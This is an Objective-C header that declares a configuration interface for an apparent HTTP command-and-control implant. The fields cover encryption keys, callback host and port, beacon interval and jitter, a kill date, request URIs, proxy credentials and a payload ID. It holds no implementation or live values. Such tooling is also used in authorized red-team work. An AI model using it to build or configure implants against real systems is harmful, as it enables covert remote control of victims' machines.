// HTTPC2Config.h

#import <Foundation/Foundation.h>

@interface HTTPC2Config : NSObject

+ (NSString *)AESPSKEncKey;
+ (NSString *)AESPSKDecKey;
+ (NSString *)AESPSKValue;
+ (NSString *)callbackHost;
+ (NSInteger)callbackInterval;
+ (NSInteger)callbackJitter;
+ (NSInteger)callbackPort;
+ (BOOL)encryptedExchangeCheck;
+ (NSString *)getURI;
+ (NSDictionary *)headers;
+ (NSString *)killdate;
+ (NSString *)postURI;
+ (NSString *)proxyHost;
+ (NSString *)proxyPass;
+ (NSString *)proxyPort;
+ (NSString *)proxyUser;
+ (NSString *)queryPathName;
+ (NSString *)payloadUUID;

@end
